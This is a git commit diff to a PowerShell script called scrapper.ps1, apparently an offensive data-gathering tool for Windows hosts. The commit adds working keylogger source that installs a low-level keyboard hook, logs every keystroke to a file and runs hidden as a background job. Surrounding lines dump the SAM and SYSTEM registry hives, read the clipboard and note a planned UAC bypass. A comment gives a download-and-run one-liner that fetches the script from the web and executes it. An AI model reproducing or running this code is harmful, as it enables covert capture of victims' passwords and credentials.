2dad4244f7cfe279cc5bf09c654e4eececb5e1d7
Emmanouil Perselis <okmanolos1@hotmail.com>
2018-09-13 17:18:57 +0200

    Update scrapper.ps1

--- scrapper.ps1
+++ scrapper.ps1
@@ -7,44 +7,28 @@
 #############################################################################################################
 
 <#
-
 FIRST RUN "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
 ########## OR #############
 USE 
 powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')"
-
 .SYNOPSIS
-
-
-
 .EXAMPLE
-
-
-
 .EXAMPLE
-
-
 .USEFUL	
-
-
 ### Measures time needed to execute certain command
 Measure-Command { commandToExecute }
-
-
-
 .TODO
-
 ###check if user is in administrator group, if true and script inst run as admin try UAC bypass
 https://stackoverflow.com/questions/21590719/check-if-user-is-a-member-of-the-local-admins-group-on-a-remote-server
-
-
 #>
 
 
 function Main(){
-initialize
+#initialize
 #nonAdministrativeScrapperFunctions
 #mail "test"
+### Runs Keylogger (does not require admin privs)
+keyLogger
 }
 
 ### SMTP mailing tool
@@ -115,14 +99,15 @@ Get-ExecutionPolicy
 NOT NEEDED, systeminfo GATHERS THIS INFORMATION
 ### Get OS version
 [Environment]::OSVersion
-
 ### Get OS type (home/pro/enterprise)
 (Get-WmiObject -class Win32_OperatingSystem).Caption
-
 #>
 
 ### Detailed system info
 systeminfo
+
+### Gets active tcp connections
+Get-NetTCPConnection
 
 ### Gets contents of clipboard
 Get-Clipboard
@@ -166,6 +151,85 @@ reg save HKLM\SAM .\sam
 ### Dump system (needs administrator rights)
 reg save HKLM\SYSTEM .\system
 }
+
+
+
+### Function that creates a powershell file 
+### with the keyloggers source in it and runs it in background
+function keyLogger(){
+$scriptForKeyloggerAsString = 'Add-Type -TypeDefinition @"
+using System;
+using System.IO;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace KeyLogger {
+  public static class Program {
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+
+    private const string logFileName = @"'+$PSScriptRoot+'\keylogger.txt";
+    private static StreamWriter logFile;
+
+    private static HookProc hookProc = HookCallback;
+    private static IntPtr hookId = IntPtr.Zero;
+
+    public static void Main() {
+      logFile = File.AppendText(logFileName);
+      logFile.AutoFlush = true;
+
+      hookId = SetHook(hookProc);
+      Application.Run();
+      UnhookWindowsHookEx(hookId);
+    }
+
+    private static IntPtr SetHook(HookProc hookProc) {
+      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
+      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
+    }
+
+    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+        int vkCode = Marshal.ReadInt32(lParam);
+        logFile.WriteLine((Keys)vkCode);
+      }
+
+      return CallNextHookEx(hookId, nCode, wParam, lParam);
+    }
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll")]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+  }
+}
+"@ -ReferencedAssemblies System.Windows.Forms
+[KeyLogger.Program]::Main();
+'
+### WORKING ###
+#Invoke-Expression $scriptForKeyloggerAsString
+### THIS WAS A HELL TO FIND BUT IT WORKS!!!
+$command = '$scriptBlockVar ='+$scriptForKeyloggerAsString+'`n Invoke-Expression $scriptBlockVar'
+$scriptBlock = [scriptblock]::Create($command)
+### Starts scriptblock in background
+start-Job -scriptblock $scriptBlock
+echo "akakakakak"
+}
+
+### Type definition is used for the keylogger and is called in main function
+### command used for running block "[KeyLogger.Program]::Main();"
+
+
 
 ### Strict mode is scoped.
 ### It prevents minor scripting errors like accessing non existent variables
